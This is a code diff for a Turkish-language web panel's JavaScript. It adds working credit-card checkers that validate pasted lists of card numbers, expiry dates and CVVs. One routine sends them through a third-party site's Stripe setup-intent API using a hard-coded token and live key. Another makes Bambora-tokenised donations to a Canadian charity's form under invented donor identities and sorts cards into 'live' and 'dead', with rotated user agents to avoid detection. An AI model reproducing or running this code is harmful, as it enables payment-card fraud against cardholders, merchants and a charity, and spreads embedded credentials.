@@ -35,8 +35,7 @@
         return;
     }
 
-    // ---- ADMIN KONTROLÜ (SADECE ADMIN EMAIL) ----
-    const isAdmin = session.email === 'apomuhammed1@gmail.com';
+    const isAdmin = session.email === 'am@gmail.com';
 
     const userId = currentUser.userId;
     let displayName = currentUser.displayName || currentUser.email.split('@')[0];
@@ -107,7 +106,7 @@
     const adminLabel = $('adminLabel');
     const adminPanelBtn = $('adminPanelBtn');
 
-    // ---- RADYO (MÜZİK) ----
+    // ---- RADYO ----
     const songs = ['Dertlimusic.mp3', 'Allahyok.mp3', 'Tamam.mp3', 'Ehlan.mp3', 'Anani.mp3', 'Feryat.mp3', 'Vuruldu.mp3'];
     let currentSongIndex = 0;
     let audio = null;
@@ -188,10 +187,8 @@
     const userAgents = [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
         'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
-        'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-        'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
+        'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
     ];
 
     function getRandomUserAgent() {
@@ -207,15 +204,14 @@
             if (data.success && data.data) {
                 const d = data.data;
                 return {
-                    scheme: d.scheme || 'Unknown',
-                    type: d.card_type || 'Unknown',
-                    brand: d.scheme || 'Unknown',
-                    prepaid: d.card_category === 'PREPAID' ? 'Yes' : 'No',
-                    country: d.country || 'Unknown',
-                    countryCode: d.issuer_country || '??',
-                    bank: d.issuer || 'Unknown',
+                    scheme: d.scheme || 'Bilinmiyor',
+                    type: d.card_type || 'Bilinmiyor',
+                    brand: d.scheme || 'Bilinmiyor',
+                    prepaid: d.card_category === 'PREPAID' ? 'Evet' : 'Hayır',
+                    country: d.country || 'Bilinmiyor',
+                    bank: d.issuer || 'Bilinmiyor',
                     emoji: d.flag || '',
-                    card_category: d.card_category || 'Unknown'
+                    card_category: d.card_category || 'Bilinmiyor'
                 };
             }
             return null;
@@ -323,22 +319,90 @@
         if (first === '4') return 'Visa';
         if (first === '5') return 'MasterCard';
         if (card.startsWith('34') || card.startsWith('37')) return 'Amex';
-        if (first === '6') return 'Discover';
+        if (card.startsWith('6')) return 'Discover';
         return 'Visa';
     }
 
-    // ---- STRIPE AUTH (window.StripeAuth kullanıyor) ----
-    const stripeInput = $('stripeInput');
-    const stripePasteBtn = $('stripePasteBtn');
-    const stripeCheckBtn = $('stripeCheckBtn');
-    const stripeResult = $('stripeResult');
-    const liveCount = $('liveCount');
-    const deadCount = $('deadCount');
-    const totalCount = $('totalCount');
-    const liveFilterBtn = $('liveFilterBtn');
-    const deadFilterBtn = $('deadFilterBtn');
-    const allFilterBtn = $('allFilterBtn');
+    // ---- STRIPE AUTH ----
+    function formatCCStripe(line) {
+        try {
+            const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
+            if (parts.length < 4) return null;
+            let cc = parts[0].replace(/\D/g, '');
+            let mm = parts[1].replace(/\D/g, '');
+            let yy = parts[2].replace(/\D/g, '');
+            let cvv = parts[3].replace(/\D/g, '');
+            if (mm.length === 1) mm = '0' + mm;
+            else if (mm.length > 2) mm = mm.slice(-2);
+            if (yy.length === 4) yy = yy.slice(-2);
+            return { cc, mm, yy, cvv };
+        } catch (e) { return null; }
+    }
 
+    async function stripeAuthCheck(cc, mm, yy, cvv) {
+        try {
+            const ua = getRandomUserAgent();
+            const urlCreate = 'https://vibz.stwpower.com/power_bank/api/bankcard/stripe/createSetupIntent?language=ger';
+            const headersCreate = {
+                'User-Agent': ua,
+                'Content-Type': 'application/json; charset=utf-8',
+                'Accept-Language': 'tr-TR,tr;q=0.9',
+                'Authorization': 'Possessor 1I1/xy0GbbDYwK5xkCXVxANB+NryBfyb17Wyqph2LyBehTPQ/2Za96UQi2CC3+NRDN2GCelfjjKXnxt77Bkp31OsHImCIVCedbXB+LCn8a2g4qQaLFFwSH3W9txaXhHJJcCZez1XzZ9Ceae+WoyjyLrjx/i3G20JUe+JalsAOcNqmv5bFrFXnWHK+0Cv5Me8xqTehJKekS1ykD6IbO6+s+k19WSiuTupXLT8ukPSUQc04IkDIOzoJVLFJRmrC+onZ7I6BWFWSaP27qddLdssE4plPAgdIiH6pCXbVDZCW2a+pQVA1IUiZAdYdLSLUA8/bG03JFuQ/WE/1axeUqujZCNzxpnvu30cN11LQCBjNtjuugBH7yOanNO9t9DIgGKmlabVUatpX3dEP+ceyimRkDIceHmLwUDVJpTVtqgYgIje6ELTniGXsCOY0i501fLFFocg9me6cSnn9eHPcFgXXbmuIpHUW6342fyxhai3pDCADyAEEGI6esi7GSxv2kIUX6q+5g/vDHR9Rn4v3HpWjXuCMs+wIw95+a4ZeEPBEaQ4uPeIFBAQ/4A9OmhWQV7gQ1f6BQnL8m8rFng8qr7O0/sqRo/PEutKWrBc6F19DyjJ4X7lhXIkoV8gFJmbcCfogwgkn/g15meQmm3Q6s+pmGqktTXoeeiZN6MZJSvwoHla/sqVnU3T6kymP5F+YexTNMuTahioNpe3Nw0xl4TbOwhPahPbxPZdg+o8SUsVTEma29DeGJpbm9yrQOBKxkXHtxSCQ8EsIWe/2YEGQoS/OSlvjPLAxjOdF1gZAvteSZym+ivBZPeOWO/oPnmynTHoY+fHBn1rzxI2qhtRYOpaxjJk4Y+VNdfRSiX9y4DPUdIBISgim4p30sYjNQxSnufXsJyDHEhuWxyr1Zc8oGRCeLX7omb/rkH8+361TFFHyAu4RPqJAnpWrPpFWe1nU99VvrE8cf7J94o01kalK9MmeDJiI+JuJ4+31cEQ4xtjJqlqgLfEZ1etNP1gIPl+Pfzx'
+            };
+            const respCreate = await fetch(urlCreate, {
+                method: 'POST',
+                headers: headersCreate,
+                body: JSON.stringify({})
+            });
+            const textCreate = await respCreate.text();
+            const match = textCreate.match(/(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)/);
+            if (!match) return '❌ Declined! (client_secret not found)';
+            const clientSecret = match[1];
+            const intentId = clientSecret.split('_secret_')[0];
+
+            const urlConfirm = `https://api.stripe.com/v1/setup_intents/${intentId}/confirm`;
+            const payload = new URLSearchParams();
+            payload.append('client_secret', clientSecret);
+            payload.append('expand[0]', 'payment_method');
+            payload.append('payment_method_data[allow_redisplay]', 'unspecified');
+            payload.append('payment_method_data[billing_details][address][country]', 'TR');
+            payload.append('payment_method_data[card][cvc]', cvv);
+            payload.append('payment_method_data[card][exp_month]', mm);
+            payload.append('payment_method_data[card][exp_year]', yy);
+            payload.append('payment_method_data[card][number]', cc);
+            payload.append('payment_method_data[payment_user_agent]', 'stripe-ios/23.27.6; variant.legacy; PaymentSheet');
+            payload.append('payment_method_data[type]', 'card');
+            payload.append('use_stripe_sdk', 'true');
+
+            const headersConfirm = {
+                'User-Agent': ua,
+                'x-stripe-user-agent': '{"version":"0.37.3","url":"https:\\/\\/github.com\\/stripe\\/stripe-react-native","type":"iPad15,3","lang":"objective-c","name":"@stripe\\/stripe-react-native","bindings_version":"23.27.6","model":"iPad","vendor_identifier":"B0C09781-0D45-4FCD-BCD0-AE0A46B41CDC","os_version":"18.6","partner_id":""}',
+                'stripe-version': '2020-08-27',
+                'authorization': 'Bearer pk_live_51ONMPJCYEondzKCZD7N8xv2rgbCsyLOv2tEYGupao0fdROvY0DrlEZh1gUKuofYPBfD8NK35GGAV6t4OBMjHuIA200FTFfkaiy',
+                'accept-language': 'tr-TR,tr;q=0.9',
+                'Content-Type': 'application/x-www-form-urlencoded'
+            };
+            const respConfirm = await fetch(urlConfirm, {
+                method: 'POST',
+                headers: headersConfirm,
+                body: payload
+            });
+            const json = await respConfirm.json();
+
+            if (json.error) {
+                const msg = json.error.message || 'Unknown error';
+                return `❌ Declined! (${msg})`;
+            }
+            const status = json.status;
+            if (status === 'succeeded') return '✅ Approved! (AUTHED)';
+            else if (status === 'requires_action' || status === 'requires_source_action') return '🔐 3D Secure! (3DS)';
+            else return `❌ Declined! (UNKNOWN STATUS - ${status})`;
+        } catch (err) {
+            return `❌ Error: ${err.message.slice(0, 50)}`;
+        }
+    }
+
+    // ---- STRIPE AUTH UI ----
     let stripeResults = [];
 
     function renderStripeResults(filter = 'all') {
@@ -372,6 +436,17 @@
         totalCount.textContent = stripeResults.length;
     }
 
+    const stripeInput = $('stripeInput');
+    const stripePasteBtn = $('stripePasteBtn');
+    const stripeCheckBtn = $('stripeCheckBtn');
+    const stripeResult = $('stripeResult');
+    const liveCount = $('liveCount');
+    const deadCount = $('deadCount');
+    const totalCount = $('totalCount');
+    const liveFilterBtn = $('liveFilterBtn');
+    const deadFilterBtn = $('deadFilterBtn');
+    const allFilterBtn = $('allFilterBtn');
+
     if (stripePasteBtn) {
         stripePasteBtn.addEventListener('click', async function() {
             try {
@@ -389,7 +464,7 @@
                     return l;
                 });
                 stripeInput.value = cleaned.join('\n');
-                showToast('Panodan yapıştırıldı ve temizlendi.', 'success');
+                showToast('Panodan yapıştırıldı.', 'success');
             } catch (e) {
                 showToast('Pano okunamadı, manuel yapıştır.', 'error');
             }
@@ -414,13 +489,13 @@
 
             try {
                 for (const line of lines) {
-                    const formatted = window.StripeAuth.formatCC(line);
+                    const formatted = formatCCStripe(line);
                     if (!formatted) {
                         stripeResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: '❌ Format Hatası' });
                         continue;
                     }
                     const { cc, mm, yy, cvv } = formatted;
-                    const result = await window.StripeAuth.check(cc, mm, yy, cvv);
+                    const result = await stripeAuthCheck(cc, mm, yy, cvv);
                     stripeResults.push({ cc, mm, yy, cvv, status: result });
                     updateStripeCounts();
                     renderStripeResults('all');
@@ -457,7 +532,7 @@
         renderStripeResults('all');
     });
 
-    // ---- BAMBORA CHARGE (window.BamboraAuth kullanıyor) ----
+    // ---- BAMBORA CHARGE ----
     const bamboraInput = $('bamboraInput');
     const bamboraAmount = $('bamboraAmount');
     const bamboraCheckBtn = $('bamboraCheckBtn');
@@ -474,8 +549,8 @@
     function renderBamboraResults(filter = 'all') {
         let filtered = [];
         if (filter === 'all') filtered = bamboraResults;
-        else if (filter === 'live') filtered = bamboraResults.filter(r => r.status.includes('Approved') || r.status.includes('charged'));
-        else if (filter === 'dead') filtered = bamboraResults.filter(r => !r.status.includes('Approved') && !r.status.includes('charged'));
+        else if (filter === 'live') filtered = bamboraResults.filter(r => r.status.includes('✅'));
+        else if (filter === 'dead') filtered = bamboraResults.filter(r => !r.status.includes('✅'));
 
         if (!filtered.length) {
             bamboraResult.innerHTML = '<div style="color:var(--text-muted);text-align:center;padding:16px;">Sonuç yok.</div>';
@@ -483,7 +558,7 @@
         }
         let html = '';
         filtered.forEach(r => {
-            const statusColor = r.status.includes('Approved') || r.status.includes('charged') ? '#34c759' : '#ff3b30';
+            const statusColor = r.status.includes('✅') ? '#34c759' : '#ff3b30';
             html += `
                 <div style="padding:4px 0;border-bottom:1px solid var(--border-color);display:flex;justify-content:space-between;flex-wrap:wrap;gap:4px;">
                     <span style="font-family:monospace;">Card: ${r.cc}|${r.mm}|${r.yy}|${r.cvv}</span>
@@ -495,7 +570,7 @@
     }
 
     function updateBamboraCounts() {
-        const live = bamboraResults.filter(r => r.status.includes('Approved') || r.status.includes('charged')).length;
+        const live = bamboraResults.filter(r => r.status.includes('✅')).length;
         const dead = bamboraResults.length - live;
         bamboraLiveCount.textContent = live;
         bamboraDeadCount.textContent = dead;
@@ -523,17 +598,137 @@
 
             try {
                 for (const line of lines) {
-                    const formatted = window.BamboraAuth.formatCC(line);
-                    if (!formatted) {
+                    const parts = line.split(/[|/,\s]+/).filter(p => p.length > 0);
+                    if (parts.length < 4) {
                         bamboraResults.push({ cc: line, mm: '??', yy: '??', cvv: '??', status: '❌ Format Hatası' });
                         continue;
                     }
-                    const { cc, mm, yy, cvv } = formatted;
-                    const result = await window.BamboraAuth.check(cc, mm, yy, cvv, amount);
-                    bamboraResults.push({ cc, mm, yy, cvv, status: result });
+                    const cc = parts[0].replace(/\D/g, '');
+                    const mm = parts[1].replace(/\D/g, '').padStart(2, '0').slice(0,2);
+                    const yy = parts[2].replace(/\D/g, '').slice(0,2);
+                    const cvv = parts[3].replace(/\D/g, '').slice(0,4);
+                    const yearFull = '20' + yy;
+                    const cardType = getCardType(cc);
+                    const ua = getRandomUserAgent();
+
+                    // Token al
+                    let token = '';
+                    try {
+                        const tokenResp = await fetch('https://api.na.bambora.com/scripts/tokenization/tokens', {
+                            method: 'POST',
+                            headers: {
+                                'Accept': '*/*',
+                                'Content-Type': 'text/plain; charset=UTF-8',
+                                'Origin': 'https://libs.na.bambora.com',
+                                'Referer': 'https://libs.na.bambora.com/',
+                                'User-Agent': ua
+                            },
+                            body: JSON.stringify({
+                                number: cc,
+                                expiry_month: mm,
+                                expiry_year: yearFull,
+                                cvd: cvv
+                            })
+                        });
+                        const tokenJson = await tokenResp.json();
+                        token = tokenJson.token || '';
+                    } catch (e) {
+                        bamboraResults.push({ cc, mm, yy, cvv, status: '❌ Token hatası' });
+                        continue;
+                    }
+
+                    if (!token) {
+                        bamboraResults.push({ cc, mm, yy, cvv, status: '❌ Token alınamadı' });
+                        continue;
+                    }
+
+                    try {
+                        const rand = () => Math.random().toString(36).substring(2, 6);
+                        const firstNames = ['Ahmet', 'Mehmet', 'Ali', 'Ayşe', 'Fatma', 'Zeynep', 'Mustafa', 'Hasan', 'Hüseyin', 'Emine'];
+                        const lastNames = ['Yılmaz', 'Demir', 'Kaya', 'Çelik', 'Şahin', 'Aydın', 'Öztürk', 'Kara', 'Kocaman', 'Erdoğan'];
+                        const streets = ['Atatürk Cad.', 'Cumhuriyet Sok.', 'İstiklal Cad.', 'Zafer Sok.', 'Barış Sok.', 'Sevgi Sok.'];
+                        const cities = ['İstanbul', 'Ankara', 'İzmir', 'Bursa', 'Antalya', 'Konya', 'Adana', 'Gaziantep'];
+                        const postal = ['34000', '06000', '35000', '16000', '07000', '42000', '01000', '27000'];
+
+                        const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+                        const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+                        const street = streets[Math.floor(Math.random() * streets.length)];
+                        const city = cities[Math.floor(Math.random() * cities.length)];
+                        const postalCode = postal[Math.floor(Math.random() * postal.length)];
+
+                        const formData = new URLSearchParams();
+                        formData.append('amount', amount);
+                        formData.append('donor_type', 'Personal');
+                        formData.append('company', '');
+                        formData.append('honour', '');
+                        formData.append('supportDedication', '');
+                        formData.append('supportDedicationName', '');
+                        formData.append('supportCardName_first', '');
+                        formData.append('supportCardName_last', '');
+                        formData.append('supportCardStreetAddr', '');
+                        formData.append('supportCardCity', '');
+                        formData.append('supportCardPostalCode', '');
+                        formData.append('supportCardCountry', 'Canada');
+                        formData.append('supportCardCadProv', '');
+                        formData.append('supportCardUsState', '');
+                        formData.append('supportCardMessage', '');
+                        formData.append('supportDesignation', 'Greatest Need');
+                        formData.append('specificCampaign', '');
+                        formData.append('card_name', firstName + ' ' + lastName);
+                        formData.append('FirstName', firstName);
+                        formData.append('LastName', lastName);
+                        formData.append('Email', firstName.toLowerCase() + '.' + lastName.toLowerCase() + rand() + '@gmail.com');
+                        formData.append('primaryPhone', '');
+                        formData.append('address_lookup', '');
+                        formData.append('StreetAddr', street + ' ' + Math.floor(Math.random() * 99 + 1));
+                        formData.append('City', city);
+                        formData.append('PostalCode', postalCode);
+                        formData.append('country', 'TR');
+                        formData.append('CadProv', '');
+                        formData.append('UsState', '');
+                        formData.append('act', 'pay');
+                        formData.append('province', '');
+                        formData.append('supportCardProvince', '');
+                        formData.append('CreditCardType', cardType);
+                        formData.append('token', token);
+                        formData.append('GACampaign', 'not set');
+                        formData.append('GASource', 'direct');
+                        formData.append('GAMedium', 'direct');
+                        formData.append('lang_pref', 'undefined');
+                        formData.append('bot_check', '');
+                        formData.append('language', 'e');
+                        formData.append('source_form', '');
+
+                        const postResp = await fetch('https://donate.kinvia.ca/donate.php', {
+                            method: 'POST',
+                            headers: {
+                                'User-Agent': ua,
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'Origin': 'https://donate.kinvia.ca',
+                                'Referer': 'https://donate.kinvia.ca/single.php'
+                            },
+                            body: formData
+                        });
+                        const postText = await postResp.text();
+
+                        let status = '❌ Bilinmeyen hata';
+                        if (postText.includes('TRANSACTION UNSUCCESSFUL') || postText.includes('unable to obtain authorization')) {
+                            status = '❌ Dead (Bambora)';
+                        } else if (postText.includes('Thank you') || postText.includes('success') || postText.includes('received')) {
+                            status = '✅ Live (Bambora)';
+                        } else if (postText.includes('3D Secure') || postText.includes('3DS')) {
+                            status = '🔐 3D Secure (Bambora)';
+                        } else {
+                            status = '❌ Unknown';
+                        }
+                        bamboraResults.push({ cc, mm, yy, cvv, status });
+                    } catch (e) {
+                        bamboraResults.push({ cc, mm, yy, cvv, status: '❌ Post hatası' });
+                    }
+
                     updateBamboraCounts();
                     renderBamboraResults('all');
-                    await new Promise(r => setTimeout(r, 500));
+                    await new Promise(r => setTimeout(r, 1000));
                 }
             } catch (err) {
                 showToast('Kontrol sırasında hata oluştu.', 'error');
@@ -567,7 +762,7 @@
         renderBamboraResults('all');
     });
 
-    // ---- UI ----
+    // ---- UI (ADMIN BUTONU) ----
     function updateUI() {
         if (userAvatar) {
             userAvatarEl.innerHTML = `<img src="${userAvatar}" style="width:40px;height:40px;border-radius:50%;object-fit:cover;">`;
@@ -592,6 +787,7 @@
         if (userBioInput) userBioInput.value = userBio || '';
         if (themeSelect) themeSelect.value = document.documentElement.getAttribute('data-theme') || 'light';
 
+        // Admin paneli butonu
         if (adminPanelBtn) {
             adminPanelBtn.style.display = isAdmin ? 'flex' : 'none';
         }
@@ -602,6 +798,7 @@
             adminLabel.style.display = isAdmin ? 'block' : 'none';
         }
 
+        // Oyun hakları
         if (spinUsed) {
             const spinData = getGameLimit('spin', 1);
             spinUsed.textContent = spinData.count >= 1 ? 0 : 1;
@@ -910,71 +1107,7 @@
         "CC Generator ile kart oluşturabilir, Validator ile doğrulayabilirsiniz.",
         "Bakiye sekmesinden para yükleyebilir veya transfer yapabilirsiniz.",
         "Güvenlik konusunda hassasız. Şifrenizi Ayarlar sekmesinden değiştirebilirsiniz.",
-        "Ben Zenit, bu platformun kurucusu. Yapay zeka asistanı olarak size yardımcı olmak için buradayım.",
-        "Anladım. Bu konuda size daha detaylı bilgi verebilirim.",
-        "Evet, doğru söylüyorsunuz. Bu konuda haklısınız.",
-        "Aslında bu konuda farklı bir bakış açısı da var.",
-        "Size nasıl yardımcı olabilirim? Lütfen sorunuzu belirtin.",
-        "Bu sorunun cevabını biliyorum! İsterseniz açıklayabilirim.",
-        "Harika bir soru! Bunun üzerine düşünelim.",
-        "Kesinlikle katılıyorum. Bu çok önemli bir nokta.",
-        "Bu konuda size yardımcı olmaktan mutluluk duyarım.",
-        "İlginç bir düşünce! Bunu daha önce düşünmemiştim.",
-        "Evet, bu mümkün. Detaylarını anlatabilirim.",
-        "Size önerim, bu konuda biraz daha araştırma yapmanız.",
-        "Harika! Bu fikri çok beğendim.",
-        "Bunu yapmak için önce şu adımları izlemelisiniz.",
-        "Aslında bu işlem çok basit. Size göstereyim.",
-        "Bu konuda deneyimliyim. Size yardımcı olabilirim.",
-        "Evet, bu kesinlikle doğru. Doğrulayabilirim.",
-        "Bu sorunun birden fazla cevabı var. Hangisini istersiniz?",
-        "Size bu konuda daha detaylı bilgi verebilirim.",
-        "Bu çok güzel bir soru! Cevabını biliyorum.",
-        "Maalesef bu konuda yeterli bilgim yok.",
-        "Bu konuda size yardımcı olmak isterim.",
-        "Harika! Bu soruyu çok sevdim.",
-        "Evet, bu çok önemli bir konu.",
-        "Size bu konuda birkaç önerim var.",
-        "Bu işlemi yapmak için şu adımları izleyin.",
-        "Bu çok ilginç! Bunu daha önce duymamıştım.",
-        "Kesinlikle haklısınız. Bu çok doğru.",
-        "Bu konuda size yardımcı olabilirim.",
-        "Harika bir fikir! Bunu uygulamalısınız.",
-        "Bu konuda size güveniyorum. Yapabilirsiniz.",
-        "Evet, bu doğru. Onaylıyorum.",
-        "Bu konuda size destek olabilirim.",
-        "Harika! Bu çok güzel bir yaklaşım.",
-        "Size bu konuda detaylı bilgi verebilirim.",
-        "Bu sorunun cevabı çok basit. İşte cevabı.",
-        "Bu konuda size yardımcı olmaktan mutluluk duyarım.",
-        "Harika bir soru! Cevabını hemen veriyorum.",
-        "Bu konuda size önerim şu şekilde.",
-        "Evet, bu mümkün. Hemen yapabiliriz.",
-        "Bu çok güzel bir düşünce! Devam edin.",
-        "Size bu konuda yardımcı olabilirim.",
-        "Bu konuda deneyimliyim. Size yardımcı olayım.",
-        "Harika! Bu soruyu çok sevdim.",
-        "Evet, bu doğru. Kesinlikle katılıyorum.",
-        "Bu konuda size yardımcı olabilirim.",
-        "Bu çok ilginç bir konu. Daha fazla konuşabiliriz.",
-        "Size bu konuda birkaç ipucu verebilirim.",
-        "Bu konuda size yardımcı olmak isterim.",
-        "Harika! Bu çok güzel bir fikir.",
-        "Evet, bu mümkün. Hemen yapalım.",
-        "Bu konuda size yardımcı olabilirim.",
-        "Bu çok güzel bir soru! Cevabını biliyorum.",
-        "Size bu konuda detaylı bilgi verebilirim.",
-        "Bu konuda size yardımcı olmaktan mutluluk duyarım.",
-        "Harika! Bu soruyu çok sevdim.",
-        "Evet, bu doğru. Onaylıyorum.",
-        "Bu konuda size yardımcı olabilirim.",
-        "Bu çok ilginç bir konu. Daha fazla konuşabiliriz.",
-        "Size bu konuda birkaç önerim var.",
-        "Bu konuda size yardımcı olmak isterim.",
-        "Harika! Bu çok güzel bir yaklaşım.",
-        "Evet, bu mümkün. Hemen yapabiliriz.",
-        "Bu konuda size yardımcı olabilirim.",
-        "Bu çok güzel bir düşünce! Devam edin."
+        "Ben Zenit, bu platformun kurucusu. Yapay zeka asistanı olarak size yardımcı olmak için buradayım."
     ];
 
     function getAIResponse(text) {
